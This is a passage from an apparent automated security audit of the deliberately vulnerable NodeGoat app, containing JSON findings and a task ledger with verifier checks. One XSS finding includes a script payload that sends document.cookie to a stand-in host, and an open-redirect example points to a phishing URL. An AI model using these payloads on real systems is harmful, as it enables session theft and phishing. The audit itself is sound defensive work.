pinned to the 2.x line, whose bundled helmet-csp has a CSP-configuration-override advisory, and is 5+ major versions behind current\",\n    \"file\": \"package.json\",\n    \"line\": 16,\n    \"snippet\": \"\\\"helmet\\\": \\\"^2.0.0\\\",\",\n    \"evidence\": \"package.json declares helmet at ^2.0.0; package-lock.json resolves node_modules/helmet to 2.3.0. npm audit maps its bundled helmet-csp (resolved range 1.2.2-2.9.0) to GHSA-c3m8-x3cg-qm2c (moderate, CSP directive configuration can be overridden), whose range contains the installed helmet-csp. I read the advisory text and the npm audit range match but did not read helmet-csp's own source to trace exactly which override path applies here, so this is `likely` rather than `confirmed`. Separately, helmet's own architecture changed at v4 (individual `helmet.csp()`-style middleware consolidated into a single options object); the 2.x/3.x line this project is pinned to has had no security-relevant release in years.\",\n    \"impact\": \"A misapplied or overridden CSP directive can weaken the Content-Security-Policy this middleware is meant to enforce, reducing its protection against injected script content.\",\n    \"fix\": \"Upgrade to a current major helmet (>=7) and rewrite the configuration call for the current single-object API; the 2.x call signature is not compatible with newer majors.\",\n    \"references\": [\n      \"GHSA-c3m8-x3cg-qm2c\"\n    ]\n  },\n  {\n    \"id\": \"injection-open-redirect-learn\",\n    \"cwe\": \"CWE-601\",\n    \"owasp\": \"A01:2021 Broken Access Control\",\n    \"severity\": \"medium\",\n    \"confidence\": \"confirmed\",\n    \"title\": \"Open redirect via unvalidated query parameter on /learn\",\n    \"file\": \"app/routes/index.js\",\n    \"line\": 72,\n    \"snippet\": \"return res.redirect(req.query.url);\",\n    \"evidence\": \"The GET /learn handler at app/routes/index.js:70-73 takes req.query.url straight from the request's query string and passes it to res.redirect() with no allowlist, same-origin check, or format validation; the comment on line 71 even labels this 'insecure way to handle redirects'.\",\n    \"impact\": \"An attacker can craft a link such as /learn?url=https://evil.example/phish hosted on the legitimate NodeGoat domain to redirect victims to an attacker-controlled site, aiding phishing or credential-harvesting campaigns that abuse the trusted domain's reputation.\",\n    \"fix\": \"Validate the target against an allowlist of known-safe destinations (or require it to be a relative, same-origin path) before calling res.redirect(); reject anything else.\",\n    \"references\": [\n      \"https://cwe.mitre.org/data/definitions/601.html\",\n      \"https://owasp.org/www-community/attacks/Unvalidated_Redirects_and_Forwards_Cheat_Sheet\"\n    ]\n  },\n  {\n    \"id\": \"injection-xss-profile-firstname-reflected\",\n    \"cwe\": \"CWE-79\",\n    \"owasp\": \"A03:2021 Injection\",\n    \"severity\": \"medium\",\n    \"confidence\": \"confirmed\",\n    \"title\": \"Reflected XSS in profile form via unescaped firstName on validation failure\",\n    \"file\": \"app/views/profile.html\",\n    \"line\": 41,\n    \"snippet\": \"<input type=\\\"text\\\" class=\\\"form-control\\\" id=\\\"firstName\\\" name=\\\"firstName\\\" value=\\\"{{firstNameSafeString}}\\\" placeholder=\\\"Enter first name\\\">\",\n    \"evidence\": \"POST /profile is routed in app/routes/index.js:48 to profileHandler.handleProfileUpdate. app/routes/profile.js:42-50 destructures firstName directly from req.body; when the bankRouting regex check fails, app/routes/profile.js:64 sets `const firstNameSafeString = firstName;` (a plain alias, not an escaping call despite the name) and renders it at line 65-75. The 'profile' template outputs it at app/views/profile.html:41 with {{firstNameSafeString}}, and server.js:137 sets `swig.setDefaults({ autoescape: false })` globally, so swig performs no HTML escaping on this or any other {{ }} output in the app.\",\n    \"impact\": \"An attacker can submit a firstName such as \\\"<script>document.location='https://evil.example/?c='+document.cookie</script>\\\" together with an intentionally invalid bankRouting value; the response reflects the payload unescaped into the page and executes it in the victim's browser, allowing session-cookie theft or further client-side compromise.\",\n    \"fix\": \"Re-enable swig's default autoescaping (autoescape: true) and remove the misleadingly-named `firstNameSafeString` alias; if raw HTML output is ever required, escape it explicitly at the point of use with a vetted encoder.\",\n    \"references\": [\n      \"https://cwe.mitre.org/data/definitions/79.html\",\n      \"https://owasp.org/Top10/A03_2021-Injection/\"\n    ]\n  },\n  {\n    \"id\": \"platform-error-handler-discloses-error\",\n    \"cwe\": \"CWE-209\",\n    \"owasp\": \"A05:2021 Security Misconfiguration\",\n    \"severity\": \"medium\",\n    \"confidence\": \"confirmed\",\n    \"title\": \"The global error handler renders the raw Error object into the HTML response\",\n    \"file\": \"app/routes/error.js\",\n    \"line\": 10,\n    \"endLine\": 12,\n    \"snippet\": \"res.render(\\\"error-template\\\", {\\n        error: err\\n    });\",\n    \"evidence\": \"This is the app-wide error middleware registered last in app/routes/index.js (app.use(ErrorHandler), line 82), so every unhandled error in any route reaches it. It logs err.stack server-side (line 8, correct) but also passes the whole err object as error into error-template.html, whose only content is <br>{{error}} (line 11), which stringifies the Error (at minimum its message, e.g. Mongo driver or validation error text). swig's autoescape is disabled globally in server.js (autoescape: false, line 137), so whatever that string contains is written into the response unescaped.\",\n    \"impact\": \"Internal error messages (library names, query/validation detail) reach the client on any unhandled exception, helping an attacker map the backend, and because output is unescaped, an error message containing HTML-significant characters is reflected without encoding.\",\n    \"fix\": \"Log err.stack server-side only, and render a fixed generic message plus a correlation id to the client instead of the error object itself.\",\n    \"references\": [\n      \"https://cwe.mitre.org/data/definitions/209.html\"\n    ]\n  },\n  {\n    \"id\": \"platform-missing-security-headers\",\n    \"cwe\": \"CWE-693\",\n    \"owasp\": \"A05:2021 Security Misconfiguration\",\n    \"severity\": \"medium\",\n    \"confidence\": \"confirmed\",\n    \"title\": \"helmet is installed but never mounted, so no security headers are set on any response\",\n    \"file\": \"server.js\",\n    \"line\": 10,\n    \"snippet\": \"// const helmet = require(\\\"helmet\\\");\",\n    \"evidence\": \"helmet is a declared dependency (package.json line 16) but its require is commented out here, and the entire block that would call app.disable(\\\"x-powered-by\\\"), helmet.frameguard(), helmet.contentSecurityPolicy(), helmet.hsts() and the dont-sniff-mimetype nosniff() middleware is wrapped in a comment from line 38 to line 65 inside the MongoClient.connect callback. Reading the rest of server.js end to end, no other line sets X-Frame-Options, Content-Security-Policy, Strict-Transport-Security or X-Content-Type-Options, and Express's default X-Powered-By header is left enabled.\",\n    \"impact\": \"Responses carry no clickjacking protection, no CSP, no MIME-sniffing protection and no HSTS, and the X-Powered-By: Express header discloses the framework. Any XSS or framing-based attack elsewhere in the app (the same file disables swig's autoescape at line 137) has no browser-side mitigation to work against.\",\n    \"fix\": \"Uncomment and mount helmet() (or an equivalent explicit set of headers) before the route handlers are registered, keep app.disable(\\\"x-powered-by\\\"), and configure a restrictive Content-Security-Policy instead of relying on defaults.\",\n    \"references\": [\n      \"https://cwe.mitre.org/data/definitions/693.html\",\n      \"https://helmetjs.github.io/\"\n    ]\n  },\n  {\n    \"id\": \"platform-node-env-default-development\",\n    \"cwe\": \"CWE-1188\",\n    \"owasp\": \"A05:2021 Security Misconfiguration\",\n    \"severity\": \"medium\",\n    \"confidence\": \"likely\",\n    \"title\": \"NODE_ENV silently defaults to \\\"development\\\" when unset, and the production config file adds no hardening at all\",\n    \"file\": \"config/config.js\",\n    \"line\": 5,\n    \"snippet\": \"const finalEnv = process.env.NODE_ENV || \\\"development\\\";\",\n    \"evidence\": \"When NODE_ENV is not set, config.js loads config/env/development.js, whose environmentalScripts array (lines 9-13) injects an extra <script> tag with a livereload connection into every page rendered through app/views/layout.html (line 125-127), and config/env/production.js (module.exports = {}) is an empty stub that overrides nothing, so \\\"production\\\" mode is not materially different from the base config either. docker-compose.yml only declares NODE_ENV: with no value (line 7), so a deployment started with docker-compose up and no NODE_ENV exported on the host inherits this development fallback. I read config.js and both env files directly; whether a given real deployment actually leaves NODE_ENV unset is an operational fact I did not verify, so confidence is likely rather than confirmed.\",\n    \"impact\": \"A deployment that forgets to export NODE_ENV=production runs with development settings live, including the injected livereload script tag on every authenticated page, and gets none of the (currently nonexistent) production-only hardening, silently and without any error.\",\n    \"fix\": \"Fail startup when NODE_ENV is unset instead of defaulting to \\\"development\\\", and use config/env/production.js to positively set hardened values (secure cookies, disabled verbose logging) rather than leaving it empty.\",\n    \"references\": [\n      \"https://cwe.mitre.org/data/definitions/1188.html\"\n    ]\n  },\n  {\n    \"id\": \"secrets-committed-rsa-private-key\",\n    \"cwe\": \"CWE-321\",\n    \"owasp\": \"A02:2021 Cryptographic Failures\",\n    \"severity\": \"medium\",\n    \"confidence\": \"confirmed\",\n    \"title\": \"RSA private key committed to the repository at the exact path the server's (commented-out) HTTPS setup loads\",\n    \"file\": \"artifacts/cert/server.key\",\n    \"line\": 1,\n    \"endLine\": 15,\n    \"snippet\": \"-----BEGIN RSA PRIVATE KEY-----\n[REDACTED PRIVATE KEY BODY]\n-----END RSA PRIVATE KEY-----\",\n    \"evidence\": \"This is a complete, parseable 1024-bit RSA private key (PEM, BEGIN/END RSA PRIVATE KEY), not a placeholder. server.js:21-27 (currently commented out) reads `fs.readFileSync(path.resolve(__dirname, \\\"./artifacts/cert/server.key\\\"))` as the `key` for an https.createServer options object, and the matching public certificate ships alongside it at artifacts/cert/server.crt. The live server currently only starts `http.createServer` (server.js:145), so this exact key is not loaded by the code path that actually runs today, but it is the key that would be used the moment the commented HTTPS block is restored, and it is exposed to anyone with read access to the repository regardless.\",\n    \"impact\": \"Anyone with this repository has the private key that matches the shipped TLS certificate. If this key/certificate pair is ever used to serve HTTPS (as the commented-out code in server.js is written to do), an attacker holding the key can decrypt intercepted traffic or impersonate the server in a MITM position.\",\n    \"fix\": \"Remove the private key from source control, treat it as compromised and reissue a new certificate/key pair via the deployment's certificate manager (ACME/Let's Encrypt or an internal CA), and load TLS material from a mounted secret or vault, never from a path inside the repository.\",\n    \"references\": [\n      \"https://cwe.mitre.org/data/definitions/321.html\",\n      \"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\"\n    ]\n  },\n  {\n    \"id\": \"secrets-config-logged-to-console\",\n    \"cwe\": \"CWE-532\",\n    \"owasp\": \"A09:2021 Security Logging and Monitoring Failures\",\n    \"severity\": \"medium\",\n    \"confidence\": \"confirmed\",\n    \"title\": \"Full configuration object, including the cookie secret and crypto key, is printed to stdout on every startup\",\n    \"file\": \"config/config.js\",\n    \"line\": 12,\n    \"endLine\": 13,\n    \"snippet\": \"console.log(`Current Config:`);\\nconsole.log(util.inspect(config, false, null));\",\n    \"evidence\": \"config.js builds `config` by merging config/env/all.js (which contains the literal cookieSecret \\\"session_cookie_secret_key_here\\\" and cryptoKey \\\"a_secure_key_for_crypto_here\\\", lines 8-9) with the active environment file, then this module-level code runs on every require of config.js (i.e. on every process start, since server.js:17 requires it) and logs the entire merged object with util.inspect, with no field redaction.\",\n    \"impact\": \"The session-signing secret and the encryption key are written to process stdout on every boot. In any deployment that ships stdout to a log aggregator, CI job log, or Docker/Heroku log stream, these secrets end up stored in a system that is typically more widely readable than the application's own config, widening who can forge sessions or (if the crypto key is ever wired back in) decrypt data.\",\n    \"fix\": \"Never log a config object wholesale; log only non-secret fields, or redact known-sensitive keys (cookieSecret, cryptoKey, any *secret*/*key*/*password* field) before logging.\",\n    \"references\": [\n      \"https://cwe.mitre.org/data/definitions/532.html\",\n      \"https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/\"\n    ]\n  },\n  {\n    \"id\": \"dependencies-csurf-deprecated\",\n    \"cwe\": \"CWE-1104\",\n    \"owasp\": \"A06:2021 Vulnerable and Outdated Components\",\n    \"severity\": \"low\",\n    \"confidence\": \"confirmed\",\n    \"title\": \"csurf is archived and formally deprecated by its maintainers, with no forward-fix path\",\n    \"file\": \"package.json\",\n    \"line\": 11,\n    \"snippet\": \"\\\"csurf\\\": \\\"^1.8.3\\\",\",\n    \"evidence\": \"package.json declares csurf at ^1.8.3; package-lock.json resolves node_modules/csurf to 1.9.0, its last-ever published version. `npm view csurf deprecated` returns the registry's own deprecation notice: \\\"This package is archived and no longer maintained. For support, visit https://github.com/expressjs/express/discussions\\\". npm audit's only entry for csurf is a low-severity transitive cookie advisory it carries, with no forward fixAvailable path (its suggested fix points to an older 1.2.2, i.e. there is no newer safe release).\",\n    \"impact\": \"This is not a specific CVE, but a standing risk: csurf implements this app's CSRF protection (see app's use of the `csurf` middleware) and will receive no further security fixes; the next vulnerability found in it will go unpatched upstream.\",\n    \"fix\": \"Migrate CSRF protection to a maintained package (e.g. csrf-csrf, or a hand-rolled double-submit-cookie check), since csurf will not be updated again.\",\n    \"references\": [\n      \"https://github.com/expressjs/csurf#deprecated\"\n    ]\n  },\n  {\n    \"id\": \"dependencies-floating-devdeps\",\n    \"cwe\": \"CWE-829\",\n    \"owasp\": \"A06:2021 Vulnerable and Outdated Components\",\n    \"severity\": \"low\",\n    \"confidence\": \"confirmed\",\n    \"title\": \"Two devDependencies float on a mutable reference instead of a pinned version: \\\"latest\\\" and a git tarball of a branch tip\",\n    \"file\": \"package.json\",\n    \"line\": 50,\n    \"endLine\": 51,\n    \"snippet\": \"\\\"grunt-env\\\": \\\"latest\\\",\\n\\\"grunt-if\\\": \\\"https://github.com/binarymist/grunt-if/tarball/master\\\",\",\n    \"evidence\": \"grunt-env is declared as the literal string \\\"latest\\\" rather than any version, and grunt-if is declared as a tarball URL pointing at the `master` branch tip of a third-party GitHub repository rather than a tag or commit SHA. Both resolve to whatever content exists at install time, not a fixed, auditable artifact -- unlike every other dependency in this manifest, which is at least a semver range against the npm registry.\",\n    \"impact\": \"A future `npm install` (or the initial install the lockfile does not fully pin for these two, since git/URL dependencies re-resolve non-deterministically) can silently pull in different, unreviewed code for either package, including from a compromised branch tip for grunt-if -- a supply-chain risk with no version diff to review.\",\n    \"fix\": \"Pin grunt-env to an explicit semver version from the registry, and pin grunt-if to a specific tagged release or immutable commit SHA rather than the `master` branch tip.\",\n    \"references\": []\n  },\n  {\n    \"id\": \"secrets-zap-api-key-development\",\n    \"cwe\": \"CWE-798\",\n    \"owasp\": \"A05:2021 Security Misconfiguration\",\n    \"severity\": \"low\",\n    \"confidence\": \"confirmed\",\n    \"title\": \"OWASP ZAP API key hard-coded in the committed development config\",\n    \"file\": \"config/env/development.js\",\n    \"line\": 6,\n    \"snippet\": \"   zapApiKey: \\\"v9dn0balpqas1pcc281tn5ood1\\\",\",\n    \"evidence\": \"This is not a placeholder; test/security/profile-test.js:28 reads it as `var zapApiKey = config.zapApiKey;` and passes it as the API key argument to more than a dozen live zaproxy client calls (e.g. profile-test.js:132, 138, 260) that drive a local OWASP ZAP proxy at config.zapHostName:config.zapPort (192.168.56.20:8080, same file lines 3-4) for automated security-regression scanning.\",\n    \"impact\": \"This key only authenticates to a local ZAP proxy instance used for the project's own dynamic security testing; it does not protect application user data or the production service. Anyone who can reach a NodeGoat contributor's ZAP instance on the stated local address with this key could control that scan session, which is a low-value target.\",\n    \"fix\": \"Even for local tooling, avoid committing the literal key: read it from an environment variable with no default, and treat the current value as compromised if the ZAP instance is ever reachable outside a fully isolated test network.\",\n    \"references\": [\n      \"https://cwe.mitre.org/data/definitions/798.html\"\n    ]\n  },\n  {\n    \"id\": \"secrets-zap-api-key-test\",\n    \"cwe\": \"CWE-798\",\n    \"owasp\": \"A05:2021 Security Misconfiguration\",\n    \"severity\": \"low\",\n    \"confidence\": \"confirmed\",\n    \"title\": \"OWASP ZAP API key hard-coded in the committed test config (duplicate of the development value)\",\n    \"file\": \"config/env/test.js\",\n    \"line\": 6,\n    \"snippet\": \"   zapApiKey: \\\"v9dn0balpqas1pcc281tn5ood1\\\",\",\n    \"evidence\": \"Identical literal to config/env/development.js:6, loaded instead when NODE_ENV=test (config/config.js:5,8), and consumed the same way by test/security/profile-test.js (see secrets-zap-api-key-development for the call sites). This is a test-fixture credential, lower severity than a production secret, but committed in cleartext all the same.\",\n    \"impact\": \"Same as secrets-zap-api-key-development: authenticates only to a local ZAP proxy used for the project's own dynamic scans, not to the production service or user data.\",\n    \"fix\": \"Read from an environment variable with no default; do not duplicate the same secret across committed config files.\",\n    \"references\": [\n      \"https://cwe.mitre.org/data/definitions/798.html\"\n    ]\n  }\n]\n",
+  "verifier": {
+    "exitCode": 0,
+    "output": "ok: SAFETY-REPORT.md and findings.json verified against /home/user/targets/NodeGoat\n"
+  },
+  "ledgers": [
+    {
+      "sessionId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+      "events": [
+        {
+          "type": "program/start",
+          "data": {
+            "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+            "specSha256": "14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+            "spec": {
+              "objective": "review /home/user/targets/NodeGoat for code-safety defects and deliver one verified report",
+              "baseRevision": "base",
+              "goals": [
+                {
+                  "key": "secrets",
+                  "objective": "code-safety department: secrets — hard-coded credentials and leaked configuration. Read `REPORTING.md` at the root of this worktree first: it states the finding format, the evidence rule and what you deliver. The tree under review is /home/user/targets/NodeGoat; it holds 111 files, and `target.json` beside `REPORTING.md` lists every one of them. It is read-only: read it, grep it, scan it, and write nothing into it. Before reading, run `semgrep --version`; if it prints a version, run `semgrep --config /home/user/deepseek-harness/examples/headless-agent/tests/fixtures/program-code-safety/semgrep --config p/owasp-top-ten --metrics off --json <path>` over the target (drop the registry pack and keep the local rules if the registry is unreachable) and treat every hit as a place to read, never as a finding; if semgrep is absent, say so in your report and read without it. Look for credentials, tokens, private keys, connection strings and API keys written as literals in source or configuration, for secrets committed in `.env`, config or deployment files, and for secrets reaching logs or client-side bundles. Name the exact literal line; do not report a placeholder a reader can see is one without saying so. Deliver `findings/secrets.json` and `report/secrets.md`, then commit. Your work is measured by `node verify-safety-report.mjs --findings findings/secrets.json` over a clean worktree, so run it and commit before you stop.",
+                  "preset": "secrets",
+                  "isolation": "none",
+                  "budget": {
+                    "maxTotalTokens": 4000000,
+                    "maxWallMs": 2400000
+                  },
+                  "dependsOn": [],
+                  "checks": [
+                    {
+                      "id": "secrets-findings",
+                      "outcome": "every finding secrets reported exists at the line it cites",
+                      "run": "node verify-safety-report.mjs --findings findings/secrets.json"
+                    },
+                    {
+                      "id": "secrets-section",
+                      "outcome": "secrets wrote its own section of the report",
+                      "run": "test -s report/secrets.md"
+                    }
+                  ]
+                },
+                {
+                  "key": "injection",
+                  "objective": "code-safety department: injection — injection and traversal. Read `REPORTING.md` at the root of this worktree first: it states the finding format, the evidence rule and what you deliver. The tree under review is /home/user/targets/NodeGoat; it holds 111 files, and `target.json` beside `REPORTING.md` lists every one of them. It is read-only: read it, grep it, scan it, and write nothing into it. Before reading, run `semgrep --version`; if it prints a version, run `semgrep --config /home/user/deepseek-harness/examples/headless-agent/tests/fixtures/program-code-safety/semgrep --config p/owasp-top-ten --metrics off --json <path>` over the target (drop the registry pack and keep the local rules if the registry is unreachable) and treat every hit as a place to read, never as a finding; if semgrep is absent, say so in your report and read without it. Look for SQL and NoSQL queries built by concatenation or interpolation, for `$where` and other server-side evaluation, for `eval`, `new Function` and string-bodied timers, for shell commands built from request data, for template injection, for unescaped HTML sinks, and for filesystem paths built from request data. Name the sink line, and say in `evidence` what reaches it. Deliver `findings/injection.json` and `report/injection.md`, then commit. Your work is measured by `node verify-safety-report.mjs --findings findings/injection.json` over a clean worktree, so run it and commit before you stop.",
+                  "preset": "injection",
+                  "isolation": "none",
+                  "budget": {
+                    "maxTotalTokens": 4000000,
+                    "maxWallMs": 2400000
+                  },
+                  "dependsOn": [],
+                  "checks": [
+                    {
+                      "id": "injection-findings",
+                      "outcome": "every finding injection reported exists at the line it cites",
+                      "run": "node verify-safety-report.mjs --findings findings/injection.json"
+                    },
+                    {
+                      "id": "injection-section",
+                      "outcome": "injection wrote its own section of the report",
+                      "run": "test -s report/injection.md"
+                    }
+                  ]
+                },
+                {
+                  "key": "access",
+                  "objective": "code-safety department: access — authentication, session handling and authorization. Read `REPORTING.md` at the root of this worktree first: it states the finding format, the evidence rule and what you deliver. The tree under review is /home/user/targets/NodeGoat; it holds 111 files, and `target.json` beside `REPORTING.md` lists every one of them. It is read-only: read it, grep it, scan it, and write nothing into it. Before reading, run `semgrep --version`; if it prints a version, run `semgrep --config /home/user/deepseek-harness/examples/headless-agent/tests/fixtures/program-code-safety/semgrep --config p/owasp-top-ten --metrics off --json <path>` over the target (drop the registry pack and keep the local rules if the registry is unreachable) and treat every hit as a place to read, never as a finding; if semgrep is absent, say so in your report and read without it. Look for routes that change or read data without an authentication or authorization check, for direct object references taken from the request, for session configuration that does not regenerate or expire, for missing CSRF protection on state-changing routes, and for privilege changes a user can request for themselves. Name the route line that is missing the check. Deliver `findings/access.json` and `report/access.md`, then commit. Your work is measured by `node verify-safety-report.mjs --findings findings/access.json` over a clean worktree, so run it and commit before you stop.",
+                  "preset": "access",
+                  "isolation": "none",
+                  "budget": {
+                    "maxTotalTokens": 4000000,
+                    "maxWallMs": 2400000
+                  },
+                  "dependsOn": [],
+                  "checks": [
+                    {
+                      "id": "access-findings",
+                      "outcome": "every finding access reported exists at the line it cites",
+                      "run": "node verify-safety-report.mjs --findings findings/access.json"
+                    },
+                    {
+                      "id": "access-section",
+                      "outcome": "access wrote its own section of the report",
+                      "run": "test -s report/access.md"
+                    }
+                  ]
+                },
+                {
+                  "key": "data",
+                  "objective": "code-safety department: data — sensitive data exposure, logging and cryptography. Read `REPORTING.md` at the root of this worktree first: it states the finding format, the evidence rule and what you deliver. The tree under review is /home/user/targets/NodeGoat; it holds 111 files, and `target.json` beside `REPORTING.md` lists every one of them. It is read-only: read it, grep it, scan it, and write nothing into it. Before reading, run `semgrep --version`; if it prints a version, run `semgrep --config /home/user/deepseek-harness/examples/headless-agent/tests/fixtures/program-code-safety/semgrep --config p/owasp-top-ten --metrics off --json <path>` over the target (drop the registry pack and keep the local rules if the registry is unreachable) and treat every hit as a place to read, never as a finding; if semgrep is absent, say so in your report and read without it. Look for personal data, credentials or tokens written to logs or error responses, for cleartext transport, for password storage that is not a memory-hard or iterated hash, for broken hashes and ciphers, and for secrets or personal data returned to the client. Name the line that discloses or weakly protects the data. Deliver `findings/data.json` and `report/data.md`, then commit. Your work is measured by `node verify-safety-report.mjs --findings findings/data.json` over a clean worktree, so run it and commit before you stop.",
+                  "preset": "data",
+                  "isolation": "none",
+                  "budget": {
+                    "maxTotalTokens": 4000000,
+                    "maxWallMs": 2400000
+                  },
+                  "dependsOn": [],
+                  "checks": [
+                    {
+                      "id": "data-findings",
+                      "outcome": "every finding data reported exists at the line it cites",
+                      "run": "node verify-safety-report.mjs --findings findings/data.json"
+                    },
+                    {
+                      "id": "data-section",
+                      "outcome": "data wrote its own section of the report",
+                      "run": "test -s report/data.md"
+                    }
+                  ]
+                },
+                {
+                  "key": "dependencies",
+                  "objective": "code-safety department: dependencies — vulnerable and outdated dependencies. Read `REPORTING.md` at the root of this worktree first: it states the finding format, the evidence rule and what you deliver. The tree under review is /home/user/targets/NodeGoat; it holds 111 files, and `target.json` beside `REPORTING.md` lists every one of them. It is read-only: read it, grep it, scan it, and write nothing into it. Before reading, run `semgrep --version`; if it prints a version, run `semgrep --config /home/user/deepseek-harness/examples/headless-agent/tests/fixtures/program-code-safety/semgrep --config p/owasp-top-ten --metrics off --json <path>` over the target (drop the registry pack and keep the local rules if the registry is unreachable) and treat every hit as a place to read, never as a finding; if semgrep is absent, say so in your report and read without it. Read the manifest and, when a lockfile is present, run `npm audit --json` in the target and read what it reports. Report the declared version and the advisory identifier — the GHSA or CVE — for each vulnerable package. `file` and `line` are the manifest line that declares the dependency, and `snippet` is that line. When the audit cannot reach the registry, say so in your report section and fall back to the declared versions. Deliver `findings/dependencies.json` and `report/dependencies.md`, then commit. Your work is measured by `node verify-safety-report.mjs --findings findings/dependencies.json` over a clean worktree, so run it and commit before you stop.",
+                  "preset": "dependencies",
+                  "isolation": "none",
+                  "budget": {
+                    "maxTotalTokens": 4000000,
+                    "maxWallMs": 2400000
+                  },
+                  "dependsOn": [],
+                  "checks": [
+                    {
+                      "id": "dependencies-findings",
+                      "outcome": "every finding dependencies reported exists at the line it cites",
+                      "run": "node verify-safety-report.mjs --findings findings/dependencies.json"
+                    },
+                    {
+                      "id": "dependencies-section",
+                      "outcome": "dependencies wrote its own section of the report",
+                      "run": "test -s report/dependencies.md"
+                    }
+                  ]
+                },
+                {
+                  "key": "platform",
+                  "objective": "code-safety department: platform — security misconfiguration and the web platform. Read `REPORTING.md` at the root of this worktree first: it states the finding format, the evidence rule and what you deliver. The tree under review is /home/user/targets/NodeGoat; it holds 111 files, and `target.json` beside `REPORTING.md` lists every one of them. It is read-only: read it, grep it, scan it, and write nothing into it. Before reading, run `semgrep --version`; if it prints a version, run `semgrep --config /home/user/deepseek-harness/examples/headless-agent/tests/fixtures/program-code-safety/semgrep --config p/owasp-top-ten --metrics off --json <path>` over the target (drop the registry pack and keep the local rules if the registry is unreachable) and treat every hit as a place to read, never as a finding; if semgrep is absent, say so in your report and read without it. Look for missing or weak security headers, permissive CORS, cookies without `httpOnly`, `secure` or `sameSite`, error handlers that return stack traces, missing rate limiting on authentication routes, debug or development settings left enabled, and client-side code that trusts the URL or the DOM. Name the configuration line. Deliver `findings/platform.json` and `report/platform.md`, then commit. Your work is measured by `node verify-safety-report.mjs --findings findings/platform.json` over a clean worktree, so run it and commit before you stop.",
+                  "preset": "platform",
+                  "isolation": "none",
+                  "budget": {
+                    "maxTotalTokens": 4000000,
+                    "maxWallMs": 2400000
+                  },
+                  "dependsOn": [],
+                  "checks": [
+                    {
+                      "id": "platform-findings",
+                      "outcome": "every finding platform reported exists at the line it cites",
+                      "run": "node verify-safety-report.mjs --findings findings/platform.json"
+                    },
+                    {
+                      "id": "platform-section",
+                      "outcome": "platform wrote its own section of the report",
+                      "run": "test -s report/platform.md"
+                    }
+                  ]
+                }
+              ],
+              "integration": {
+                "checks": [
+                  {
+                    "id": "safety-report",
+                    "outcome": "the merged report and its union of findings pass the committed examiner",
+                    "run": "node verify-safety-report.mjs --report"
+                  }
+                ],
+                "gates": [
+                  "test -z \"$(git status --porcelain)\"",
+                  "test -s SAFETY-REPORT.md"
+                ]
+              },
+              "signoff": {
+                "artefactSha256": "5afe5afe5afe5afe5afe5afe5afe5afe5afe5afe5afe5afe5afe5afe5afe5afe"
+              },
+              "implementer": {
+                "kind": "route"
+              }
+            },
+            "baseRevision": "base",
+            "implementer": {
+              "kind": "route"
+            },
+            "signoff": {
+              "artefactSha256": "5afe5afe5afe5afe5afe5afe5afe5afe5afe5afe5afe5afe5afe5afe5afe5afe"
+            }
+          }
+        },
+        {
+          "type": "program/goal",
+          "data": {
+            "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+            "key": "secrets",
+            "status": "pending"
+          }
+        },
+        {
+          "type": "program/goal",
+          "data": {
+            "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+            "key": "injection",
+            "status": "pending"
+          }
+        },
+        {
+          "type": "program/goal",
+          "data": {
+            "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+            "key": "access",
+            "status": "pending"
+          }
+        },
+        {
+          "type": "program/goal",
+          "data": {
+            "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+            "key": "data",
+            "status": "pending"
+          }
+        },
+        {
+          "type": "program/goal",
+          "data": {
+            "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+            "key": "dependencies",
+            "status": "pending"
+          }
+        },
+        {
+          "type": "program/goal",
+          "data": {
+            "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+            "key": "platform",
+            "status": "pending"
+          }
+        },
+        {
+          "type": "program/goal",
+          "data": {
+            "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+            "key": "injection",
+            "status": "running",
+            "sessionId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c-injection",
+            "workspace": "/home/user/deepseek-harness/.code-safety/NodeGoat-2026-09-19T20-49-35/repo/program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c/injection"
+          }
+        },
+        {
+          "type": "program/goal",
+          "data": {
+            "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+            "key": "access",
+            "status": "running",
+            "sessionId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c-access",
+            "workspace": "/home/user/deepseek-harness/.code-safety/NodeGoat-2026-09-19T20-49-35/repo/program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c/access"
+          }
+        },
+        {
+          "type": "program/goal",
+          "data": {
+            "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+            "key": "secrets",
+            "status": "running",
+            "sessionId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c-secrets",
+            "workspace": "/home/user/deepseek-harness/.code-safety/NodeGoat-2026-09-19T20-49-35/repo/program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c/secrets"
+          }
+        },
+        {
+          "type": "program/goal",
+          "data": {
+            "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+            "key": "injection",
+            "status": "certified",
+            "sessionId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c-injection",
+            "workspace": "/home/user/deepseek-harness/.code-safety/NodeGoat-2026-09-19T20-49-35/repo/program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c/injection",
+            "revision": "683e56d85a58bb9fa827bb46b96f00b4f9ddfc34",
+            "tree": "f134006b71bedbb4ebab836e18afeb656dcaeb49"
+          }
+        },
+        {
+          "type": "program/goal",
+          "data": {
+            "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+            "key": "data",
